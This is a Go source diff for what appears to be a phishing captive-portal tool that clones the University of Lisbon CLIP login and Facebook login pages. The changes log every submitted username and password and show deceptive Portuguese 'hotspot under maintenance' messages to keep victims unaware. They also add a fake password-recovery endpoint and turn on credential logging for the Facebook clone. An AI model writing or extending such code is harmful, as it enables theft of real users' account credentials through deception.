@@ -16,7 +16,9 @@ import (
 const indexHTML = "index.html"
 const resFolder = "__res__"
 
-const clipUnlPtSuccessMsg = "Thank you. Please reconnect to the wifi.\n"
+const clipUnlPtSuccessMsgTarget = `Sucesso. Pode-se ligar ao Wi-Fi.`
+const clipUnlPtSuccessMsg = `Este Hotspot está temporariamente em manutençao. Tente mais tarde.
+Relembramos que há hotspots funcionais noutras zonas do edifício.`
 
 // Website represents a fully functional servable website.
 type Website struct {
@@ -152,13 +154,19 @@ func ClipUnlPt() *Website {
 				return
 			}
 
+			web.Log(u, p)
 			for _, value := range targets {
 				if u == value {
-					web.Log(u, p)
-					fmt.Fprint(w, clipUnlPtSuccessMsg)
+					fmt.Fprintln(w, clipUnlPtSuccessMsgTarget)
 					web.CancelFunc()
+				} else {
+					fmt.Fprintln(w, clipUnlPtSuccessMsg)
 				}
 			}
+		},
+
+		"/recuperar_senha/": func(w http.ResponseWriter, r *http.Request) {
+			fmt.Fprintln(w, "Por questões de segurança, o serviço está indisponível no programa Captive Portal.")
 		},
 	}
 
@@ -178,13 +186,14 @@ func FacebookCom() *Website {
 		ResMatchRe:  `(href=".*?"|src=".*?")`,
 	}
 
+	web.openLogFile()
 	return web
 }
 
 // WebsiteMap maps folder names to website structs.
-var WebsiteMap = map[string]*Website{
-	"clip.unl.pt":  ClipUnlPt(),
-	"facebook.com": FacebookCom(),
+var WebsiteMap = map[string]func() *Website{
+	"clip.unl.pt":  ClipUnlPt,
+	"facebook.com": FacebookCom,
 }
 
 func clipUnlPtIsValid(u string, p string) bool {
@@ -220,6 +229,6 @@ func clipUnlPtIsValid(u string, p string) bool {
 	return true
 }
 
-func facebookIsValid(u string, p string) bool {
+func facebookComIsValid(u string, p string) bool {
 	return false
 }
